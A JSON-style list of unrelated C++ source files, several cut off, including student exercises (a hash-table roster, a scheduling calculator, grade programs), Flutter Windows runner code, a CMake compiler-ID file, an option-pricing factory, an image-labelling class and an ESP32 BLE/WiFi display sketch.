    "//hashtable firaol Berehanu \n//inputs a list of number using a key\n//using changing to stor multiple values at one idnex\n//also has rehash if the function becomes to crowed by having a index\n//source - youtbe and stakoverfolow\n\n\n#include <iostream>\n#include <cstring>\n#include <vector>\n#include <iomanip> \n#include <fstream>\n\nusing namespace std;\n// Struct definition\nstruct Student {\n    char givenName[100];\n    char surname[100];\n    float grade;\n    int studentID;\n    Student* next = NULL;\n};\n\n// Function declarations\nStudent** addPupils(Student** roster, int &currentID, int &capacity);\nStudent** manAdd(Student** roster, int &currentID, int &capacity);\nvoid displayAll(Student** roster, int capacity);\nvoid display(Student** roster, int capacity);\nvoid eliminate(Student** roster, int capacity);\nvoid resetRoster(Student* roster[], int capacity);\nvoid printChain(Student* current);\nStudent** rehashRoster(Student** roster, Student** newRoster, int &capacity, int currentID);\n\n// Main function\nint main() {\n    srand(time(0));\n    bool exitProgram = false;\n    Student** roster = new Student*[100];\n    char userInput[7];\n    int currentID = 0;\n    int capacity = 100;\n    resetRoster(roster, capacity);\n    while (!exitProgram) {\n        cout << \"Please enter a valid command (ADD, MADD, PRINT, ALL(PRINT ALL), DELETE, QUIT):\" << endl;\n        cin >> userInput;\n        if (strcmp(userInput, \"MADD\") == 0) {\n            roster = manAdd(roster, currentID, capacity);\n        }\n        if (strcmp(userInput, \"ADD\") == 0) {\n            roster = addPupils(roster, currentID, capacity);\n        }\n        else if (strcmp(userInput, \"ALL\") == 0) {\n            displayAll(roster, capacity);\n        }\n        else if (strcmp(userInput, \"PRINT\") == 0) {\n            display(roster, capacity);\n        }\n        else if (strcmp(userInput, \"DELETE\") == 0) {\n            eliminate(roster, capacity);\n        }\n        else if (strcmp(userInput, \"QUIT\") == 0) {\n            exitProgram = true;\n        }\n    }\n    return 0;\n}\n\n// Function to add pupils\nStudent** addPupils(Student** roster, int &currentID, int &capacity) {\n    int students;\n    cout << \"How many students would you like to add?\" << endl;\n    cin >> students;\n    for (int i = 0; i < students; i++) {\n        char input[100];\n        char givenName[100];\n        char surname[100];\n        fstream givenFile(\"givenName.txt\");\n        fstream surnameFile(\"surname.txt\");\n        int count;\n        int num = (rand() % 20) + 1;\n        int num2 = (rand() % 20) + 1;\n        Student* newStudent = new Student();\n        count = 1;\n        while (givenFile.getline(input, 100, '\\n')) {\n            if (count == num) {\n                strcpy(givenName, input);\n                count++;\n            }\n            count++;\n        }\n        givenFile.close();\n        count = 1;\n        while (surnameFile.getline(input, 100, '\\n')) {\n            if (count == num2) {\n                strcpy(surname, input);\n                count++;\n            }\n            count++;\n        }\n        surnameFile.close();\n        float r = static_cast <float> (rand()) / static_cast <float> (RAND_MAX);\n        r *= 23;\n        while (r > 4) {\n            r -= 4;\n            while (r < 2) {\n                r += 1;\n            }\n        }\n        strcpy(newStudent->givenName, givenName);\n        strcpy(newStudent->surname, surname);\n        newStudent->studentID = currentID;\n        newStudent->grade = r;\n        if (roster[(currentID) % capacity] == NULL) {\n            roster[(currentID % capacity)] = newStudent;\n        }\n        else {\n            if (roster[(currentID) % capacity]->next == NULL) {\n                roster[currentID % capacity]->next = newStudent;\n            }\n            else {\n                if (roster[(currentID) % capacity]->next->next == NULL) {\n                    roster[currentID % capacity]->next->next = newStudent;\n                }\n                else {\n                    Student** newRoster = new Student*[capacity * 2];\n                    resetRoster(newRoster, capacity * 2);\n                    roster = rehashRoster(roster, newRoster, capacity, currentID);\n                    roster[currentID % capacity]->next = newStudent;\n                }\n            }\n        }\n        currentID++;\n    }\n    return roster;\n}\n\n// Function to manually add a student\nStudent** manAdd(Student** roster, int &currentID, int &capacity) {\n    char input[100];\n    char givenName[100];\n    char surname[100];\n    float grade;\n    Student* newStudent = new Student();\n    cout << \"Enter the first name:\" << endl;\n    cin >> givenName;\n    cin.clear();\n    cout << \"Enter the last name:\" << endl;\n    cin >> surname;\n    cin.clear();\n    cout << \"Enter the grade:\" << endl;\n    cin >> grade;\n    cin.clear();\n    strcpy(newStudent->givenName, givenName);\n    strcpy(newStudent->surname, surname);\n    newStudent->studentID = currentID;\n    newStudent->grade = grade;\n    if (roster[(currentID) % capacity] == NULL) {\n        r",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n#if !defined(__has_include)\n/* If the compiler does not have __has_include, pretend the answer is\n   always no.  */\n#  define __has_include(x) 0\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__COMO__)\n# define COMPILER_ID \"Comeau\"\n  /* __COMO_VERSION__ = VRR */\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\n\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\n     except that a few beta releases use the old format with V=2021.  */\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n#  if defined(__INTEL_COMPILER_UPDATE)\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n#  else\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n#  endif\n# else\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\n   /* The third version component from --version is an update index,\n      but no macro is provided for it.  */\n#  define COMPILER_VERSION_PATCH DEC(0)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\n# define COMPILER_ID \"IntelLLVM\"\n#if defined(_MSC_VER)\n# define SIMULATE_ID \"MSVC\"\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_ID \"GNU\"\n#endif\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\n * VVVV is no smaller than the current year when a version is released.\n */\n#if __INTEL_LLVM_COMPILER < 1000000L\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\n#else\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\n#endif\n#if defined(_MSC_VER)\n  /* _MSC_VER = VVRR */\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n#elif defined(__GNUG__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n#endif\n#if defined(__GNUC_MINOR__)\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n#endif\n#if defined(__GNUC_PATCHLEVEL__)\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n#endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ =",
    "#include <iostream>\r\nusing namespace std;\r\n\r\nint main(){\r\n\r\n    int A[50][4];\r\n    int n , i, j, min, temp, total =0;\r\n    float avgTAT, avgWT ;\r\n    cout << \"Enter the number of processes:\";\r\n    cin >> n;\r\n    cout << \"BURST TIME OF EACH PROCESS: \";\r\n    for ( i = 0; i <n ; i++){\r\n        cout <<\"Process \"<<i+1<<\" :\";\r\n        cin >> A[i][1];\r\n        A[i][0]=i+1;\r\n    }\r\n    for (i = 0;i < n; i++){\r\n        min = i;\r\n        for ( j =i+1; j<n ;j++){\r\n            if (A[j][1]<A[min][1]){\r\n                min = j;\r\n            }\r\n        }\r\n        temp = A[i][1];\r\n        A[i][1]= A[min][1];\r\n        A[min][1]=temp;\r\n\r\n        temp = A[i][0];\r\n        A[i][0] = A[min][0];\r\n        A[min][0] = temp;\r\n    }\r\n    A[0][2]=0;\r\n    for (i =1;i<n;i++){\r\n        A[i][2] = 0;\r\n        for (j=0;j<i;j++){\r\n            A[i][2] += A[j][1]; // WT = 0 + BT\r\n        }\r\n        total += A[i][2];\r\n    }\r\n    avgWT = (float)total / n;\r\n    total = 0;\r\n    cout << \"P     BT     WT     TAT\" << endl;\r\n    for (i = 0; i < n; i++) {\r\n        A[i][3] = A[i][1] + A[i][2]; // TAT = BT + WT\r\n        total += A[i][3];\r\n        cout << \"P\" << A[i][0] << \"     \" << A[i][1] << \"     \" << A[i][2] << \"      \" << A[i][3] << endl;\r\n    }\r\n    avgTAT = (float)total / n;\r\n    cout << \"Average Waiting Time= \" << avgWT << endl;\r\n    cout << \"Average Turnaround Time= \" << avgTAT << endl;\r\n}\r\n",
    "#include <iostream>\nusing namespace std;\n\nstruct DetailAlamat {\n    string desa;\n    string kota;\n};\n\nstruct Mahasiswa {\n    string nim;\n    string nama;\n    DetailAlamat alamat;\n    int umur;\n};\n\nint main() {\n    Mahasiswa mhs[3];\n    for (int i = 0; i < 3; i++) {\n        cout << \"Data ke-\" << (i+1) << \":\" << endl;\n        cout << \"Nomor Mahasiswa: \";\n        getline(cin , mhs[i].nim);\n        cout << \"Nama Mahasiswa: \";\n        getline(cin,mhs[i].nama);\n\n        cout << \"Alamat Mahasiswa: \" << endl;\n        cout << \"\\t Nama Desa: \";\n        cin >> mhs[i].alamat.desa;\n        cout << \"\\t Nama Kota: \";\n        cin >> mhs[i].alamat.kota;\n\n        cout << \"Umur Mahasiswa: \";\n        cin >> mhs[i].umur;\n        cin.ignore(1, '\\n');\n        cout << endl;\n    }\n    for (int i = 0; i < 3; i++){\n        cout << endl;\n        cout << \"Data Mahasiswa ke-\" << (i+1) << \":\" << endl;\n        cout << \"\\n NIM: \" << mhs[i].nim;\n        cout << \"\\n Nama: \" << mhs[i].nama;\n        cout << \"\\n Alamat: \";\n        cout << \"\\n \\t Desa:\" << mhs[i].alamat.desa;\n        cout << \"\\n \\t Kota: \" << mhs[i].alamat.kota;\n        cout << \"\\n Umur: \" << mhs[i].umur;\n    }\n}",
    "#include <iostream>\r\n#include <string>\r\nusing namespace std;\r\n\r\nint main() {\r\n    // Deklarasi variabel\r\n    string nama_siswa;\r\n    float nilai_keaktifan, nilai_tugas, nilai_ujian;\r\n    float nilai_murni_keaktifan, nilai_murni_tugas, nilai_murni_ujian;\r\n    float nilai_akhir;\r\n\r\n    // Masukkan data siswa\r\n    cout << \"Masukkan nama siswa: \";\r\n    getline(cin, nama_siswa);\r\n\r\n    cout << \"Masukkan nilai keaktifan: \";\r\n    cin >> nilai_keaktifan;\r\n\r\n    cout << \"Masukkan nilai tugas: \";\r\n    cin >> nilai_tugas;\r\n\r\n    cout << \"Masukkan nilai ujian: \";\r\n    cin >> nilai_ujian;\r\n\r\n    // Hitung nilai murni\r\n    nilai_murni_keaktifan = nilai_keaktifan * 0.2;\r\n    nilai_murni_tugas = nilai_tugas * 0.5;\r\n    nilai_murni_ujian = nilai_ujian * 0.3;\r\n\r\n    // Hitung nilai akhir\r\n    nilai_akhir = nilai_murni_keaktifan + nilai_murni_tugas + nilai_murni_ujian;\r\n\r\n    // Tampilkan nama siswa dan nilai akhir\r\n    cout << \"Nama siswa: \" << nama_siswa << endl;\r\n    cout << \"Nilai akhir: \" << nilai_akhir << endl;\r\n\r\n    return 0;\r\n}\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"smsautoread\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"PseudoFactory.h\"\n\n#include \"Input.h\"\n\n#include \"ApplicationBase.h\"\n#include \"Valuation.h\"\n\n#include \"ValuationMethodBase.h\"\n#include \"MCSimulation.h\"\n\n\n#include \"OptionBase.h\"\n#include \"EuroCallOption.h\"\n\n#include \"ModelBase.h\"\n#include \"GBMModel.h\"\n\n#include \"TermStructureBase.h\"\n#include \"FlatTermStructure.h\"\n\n#include <stdexcept>\n\n\ndouble PseudoFactory::GetS0() const { return input_->GetS0(); }\ndouble PseudoFactory::Getr() const { return input_->Getr(); }\ndouble PseudoFactory::Getsig() const { return input_->Getsig(); }\nchar PseudoFactory::GetPtype() const { return input_->GetPtype(); }\n\ndouble PseudoFactory::GetX() const { return input_->GetX(); }\ndouble PseudoFactory::GetT() const { return input_->GetT(); }\nchar PseudoFactory::GetOptionType() const { return input_->GetOptionType(); }\n\nlong PseudoFactory::GetM() const { return input_->GetM(); }\nlong PseudoFactory::GetN() const { return input_->GetN(); }\nlong PseudoFactory::GetNumThreads() const { return input_->GetNumThreads(); }\n\nOptionBase* PseudoFactory::CreateOption()\n{\n\tchar option_type = GetOptionType();\n\tstd::cout << \"Creating option\" << '\\n';\n\n\tswitch (option_type)\n\t{\n\tcase 'c':\n\t\treturn new EuroCallOption(*this);\n\t\tbreak;\n\n\tdefault:\n\t\tthrow std::invalid_argument(\"CreateOption: Bad character. Invalid option type\");\n\t}\n}\n\nModelBase* PseudoFactory::CreateModel()\n{\n\tchar p_type = input_->GetPtype();\n\tstd::cout << \"Creating model\" << '\\n';\n\n\tswitch (p_type)\n\t{\n\tcase 'g': return new GBMModel(*this);\n\t\tbreak;\n\tdefault: throw std::runtime_error(\"PseudoFactory::CreateModel:  Bad character\");\n\t}\n}\n\nTermStructureBase* PseudoFactory::CreateTermStructure()\n{\n\tchar ts_type = input_->GetTermStructureType();\n\tstd::cout << \"Creating term structure\" << '\\n';\n\n\tswitch (ts_type)\n\t{\n\tcase 'f': return new FlatTermStructure(*this);\n\t\tbreak;\n\n\tdefault: throw std::invalid_argument(\"Invalid term structure type\");\n\t}\n}\n\n\nValuationMethodBase* PseudoFactory::CreateValuationMethod()\n{\n\tchar meth_type = input_->GetMethodType();\n\tstd::cout << \"Creating valuation method which is MC\" << '\\n';\n\n\tswitch (meth_type)\n\t{\n\tcase 'm': return new MCSimulation(*this);\n\t\tbreak;\n\tdefault: throw std::runtime_error(\"PseudoFactory::CreateMethod:  Bad character\");\n\t}\n}\n\nApplicationBase* PseudoFactory::CreateApplication()\n{\n\tchar app_type = input_->GetApplicationtype();\n\tstd::cout << \"Creating application\" << '\\n';\n\n\tswitch (app_type)\n\t{\n\tcase 'v': return new Valuation(*this);\n\t\tbreak;\n\tdefault: throw std::runtime_error(\"PseudoFactory::CreateApplication:  Bad character\");\n\t}\n}\n",
    "#include <iostream>\n#include <fstream>\n#include <sstream>\n#include <string>\n#include <cmath>\n#include <vector>\n#include <ctime>\n\n#include \"ImageClasse.h\"\n\n#define MAGIC_NUMBER_BMP ('B'+('M'<<8)) // signature bitmap windows\n\n// constructeurs et destructeur\nCImageClasse::CImageClasse() {\n\n\tthis->m_iHauteur   = 0;\n\tthis->m_iLargeur   = 0;\n\tthis->m_sNom       = \"vide\";\n\tthis->m_lNbRegions = 0;\n\tthis->m_pucPixel   = NULL;\n}\n\nCImageClasse::CImageClasse(int hauteur, int largeur) {\n\n\tthis->m_iHauteur   = hauteur;\n\tthis->m_iLargeur   = largeur;\n\tthis->m_sNom       = \"inconnu\";\n\tthis->m_lNbRegions = 0;\n\tthis->m_pucPixel   = new unsigned long[hauteur*largeur];\n\tfor (int i=0;i<this->lireNbPixels();i++)\n\t\tthis->m_pucPixel[i] = 0; \n}\n\nCImageClasse::CImageClasse(const CImageNdg& im, std::string choix) {\n\n\tthis->m_iHauteur   = im.lireHauteur();\n\tthis->m_iLargeur   = im.lireLargeur();\n\tthis->m_sNom       = im.lireNom()+\"E\";\n\tthis->m_lNbRegions = 0;\n\tthis->m_pucPixel   = new unsigned long[m_iHauteur*m_iLargeur];\n\n\tCImageClasse withBords(im.lireHauteur()+2,im.lireLargeur()+2); \n\tint i,ii,j,jj;\n\n    for (i=0,ii=1; i < im.lireHauteur(); i++, ii++) // pure copie \n      for (j=0,jj=1; j < im.lireLargeur(); j++, jj++)\n\t\t  withBords(ii,jj) = (unsigned long)im(i,j);\n\n\tint* tableEtiquette = NULL;\n\n\tint k=1;\n\tint eps;\n\tint* predNonNul = new int [6];\n\tint nbPredNonNuls;\n\n\tint nbMaxEtiquettes = im.lireHauteur()*im.lireLargeur();\n\n\ttableEtiquette = new int [nbMaxEtiquettes];\n\tfor (int kk=0;kk<nbMaxEtiquettes;kk++) {\n\t\ttableEtiquette[kk]= kk;\n\t}\n\n\tif (choix.compare(\"V4\") == 0) {\n\t\tfor (i=1;i<withBords.lireHauteur()-1;i++)\n\t\t\tfor (j=1;j<withBords.lireLargeur()-1;j++) {\n\t\t\t\tif (withBords(i,j) != 0) {\n\t\t\t\t// V4 \n\t\t\t\tint pred1 = withBords(i,j-1);\n\t\t\t\tint pred3 = withBords(i-1,j);\n\t\t\t\n\t\t\t\tnbPredNonNuls = 0;\n\t\t\t\tif (pred1) predNonNul[nbPredNonNuls++] = pred1; \n\t\t\t\tif (pred3) predNonNul[nbPredNonNuls++] = pred3; \n\t\t\n\t\t\t\tif (nbPredNonNuls == 0) {\n\t\t\t\t\twithBords(i,j) = k;\n\t\t\t\t\tk++;\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\teps = 0;\n\t\t\t\t\tint minPred = tableEtiquette[predNonNul[0]];\n\t\t\t\t\tint maxPred = tableEtiquette[predNonNul[0]];\n\t\t\t\t\twhile (eps<nbPredNonNuls) {\n\t\t\t\t\t\tif (tableEtiquette[predNonNul[eps]] < minPred) minPred = tableEtiquette[predNonNul[eps]];\n\t\t\t\t\t\tif (tableEtiquette[predNonNul[eps]] > maxPred) maxPred = tableEtiquette[predNonNul[eps]];\n\t\t\t\t\t\teps ++;\n\t\t\t\t\t}\n\t\t\t\tif (minPred == maxPred) \n\t\t\t\t\twithBords(i,j) = minPred;\n\t\t\t\telse {\n\t\t\t\t\twithBords(i,j) = minPred;\n\t\t\t\t\tfor (eps=0;eps<nbPredNonNuls;eps++) {\n\t\t\t\t\t\tint beta = predNonNul[eps];\n\t\t\t\t\t\twhile (tableEtiquette[beta] != minPred) {\n\t\t\t\t\t\t\tint m = tableEtiquette[beta];\n\t\t\t\t\t\t\ttableEtiquette[beta] = minPred;\n\t\t\t\t\t\t\tbeta = m;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t}\n\telse { // V8\n\t\tfor (i=1;i<withBords.lireHauteur()-1;i++)\n\t\t\tfor (j=1;j<withBords.lireLargeur()-1;j++) {\n\t\t\t\tif (withBords(i,j) != 0) {\n\t\t\t\t\t// V8 \n\t\t\t\t\tint pred1 = withBords(i,j-1);\n\t\t\t\t\tint pred2 = withBords(i-1,j-1);\n\t\t\t\t\tint pred3 = withBords(i-1,j);\n\t\t\t\t\tint pred4 = withBords(i-1,j+1);\n\t\t\n\t\t\t\t\tnbPredNonNuls = 0;\n\t\t\t\t\tif (pred1) predNonNul[nbPredNonNuls++] = pred1; \n\t\t\t\t\tif (pred2) predNonNul[nbPredNonNuls++] = pred2;\n\t\t\t\t\tif (pred3) predNonNul[nbPredNonNuls++] = pred3; \n\t\t\t\t\tif (pred4) predNonNul[nbPredNonNuls++] = pred4;\n\n\t\t\t\t\tif (nbPredNonNuls == 0) {\n\t\t\t\t\t\twithBords(i,j) = k;\n\t\t\t\t\t\tk++;\n\t\t\t\t\t}\n\t\t\t\t\telse {\n\t\t\t\t\t\teps = 0;\n\t\t\t\t\t\tint minPred = tableEtiquette[predNonNul[0]];\n\t\t\t\t\t\tint maxPred = tableEtiquette[predNonNul[0]];\n\t\t\t\t\t\twhile (eps<nbPredNonNuls) {\n\t\t\t\t\t\t\tif (tableEtiquette[predNonNul[eps]] < minPred) minPred = tableEtiquette[predNonNul[eps]];\n\t\t\t\t\t\t\tif (tableEtiquette[predNonNul[eps]] > maxPred) maxPred = tableEtiquette[predNonNul[eps]];\n\t\t\t\t\t\t\teps ++;\n\t\t\t\t\t\t}\n\t\t\t\t\tif (minPred == maxPred) \n\t\t\t\t\t\twithBords(i,j) = minPred;\n\t\t\t\t\telse {\n\t\t\t\t\t\twithBords(i,j) = minPred;\n\t\t\t\t\t\tfor (eps=0;eps<nbPredNonNuls;eps++) {\n\t\t\t\t\t\t\tint beta = predNonNul[eps];\n\t\t\t\t\t\t\twhile (tableEtiquette[beta] != minPred) {\n\t\t\t\t\t\t\t\tint m = tableEtiquette[beta];\n\t\t\t\t\t\t\t\ttableEtiquette[beta] = minPred;\n\t\t\t\t\t\t\t\tbeta = m;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\t\n\t} \n  \n\t// actualisation de la table d'\u00e9quivalence\n\tfor (int kk=1;kk<k;kk++) {\n\t\tint m = kk;\n\t\twhile (tableEtiquette[m] != m) \n\t\tm = tableEtiquette[m];\n\t\ttableEtiquette[kk] = m;\n\t}\n\n\t// on vire les trous histoire que nbObjets = max de l'image label\n\tint* etiquettes = new int [k+1];\n\tfor (int kk=0;kk<k;kk++)\n\t\tetiquettes[kk] = 0;\n\n\t// histo pour rep\u00e9rer les trous\n\tfor (int kk=1;kk<k;kk++)\n\t\tetiquettes[tableEtiquette[kk]]++;\n\n\t// on remet \u00e0 jour les index (etiquetage d\u00e9finitif hors trou)\n\tetiquettes[0] = 0;\n\tint compt = 1;\n\tfor (int kk=1;kk<k;kk++) {\n\t\tif (etiquettes[kk]) \n\t\tetiquettes[kk] = compt++;\n\t}\n\n\tfor (i=0;i<withBords.lireHauteur();i++)\n\t\tfor (j=0;j<withBords.lireLargeur();j++) {\n\t\t\twithBords(i,j) = etiquettes[tableEtiquette[withBords(i,j)]];\n\t\t}\n\n\tdelete [] etiquettes;\n\tdelete [] tableEtiquette;\n\n\t// cr\u00e9ation image lab\u00e9lis\u00e9e\n\t// suppression des 2 lignes et 2 colonnes artificiellement cr\u00e9\u00e9es\n\n\tfor (i=0,ii=1;",
    "#include \"BLEDevice.h\"\r\n#include \"BLEUtils.h\"\r\n#include \"esp_sleep.h\"\r\n#include <WiFi.h>\r\n#include <HTTPClient.h>\r\n#include <ArduinoJson.h>\r\n#include \"LCD_Driver.h\"\r\n#include \"GUI_Paint.h\"\r\n#include \"image.h\"\r\n\r\n\r\nBLEAdvertising *pAdvertising;\r\n\r\nuint8_t bleMac[6] = {0x5C, 0xC3, 0x36, 0x8C, 0xBC, 0x7C};\r\nuint8_t bleRaw[31];\r\nboolean rawMoreThan31 = false;\r\nuint8_t bleRaw32[32]; \r\nconst char* ssid = \"\u4f60\u7684wifi\u540d\u5b57\";\r\nconst char* password = \"\u4f60\u7684wifi\u5bc6\u7801\";//\u628a\u624b\u673a\u70ed\u70b9\u8bbe\u7f6e\u6210\u5bf9\u5e94\u7684wifi\r\n\r\nvoid setup() {\r\n  Serial.begin(115200);\r\n\r\n  Config_Init();\r\n  LCD_Init();\r\n  LCD_SetBacklight(100);\r\n  Paint_NewImage(LCD_WIDTH, LCD_HEIGHT, 90, WHITE);\r\n  Paint_SetRotate(90);\r\n  LCD_Clear(BLACK);\r\n  delay(1000);\r\n\r\n\r\n  WiFi.begin(ssid, password);\r\n    while (WiFi.status() != WL_CONNECTED) {\r\n    delay(1000);\r\n    Serial.println(\"Connecting to WiFi...\");\r\n    LCD_Clear(BLACK);\r\n    Paint_DrawString_EN(20, 50, \"please set wifi name:liu password:liuxian88\", &Font20, BLACK, GREEN);\r\n  }\r\n  \r\n  LCD_Clear(BLACK);\r\n  Paint_DrawString_EN(20, 50, \"WiFi connected!\", &Font20, BLACK, GREEN);\r\n  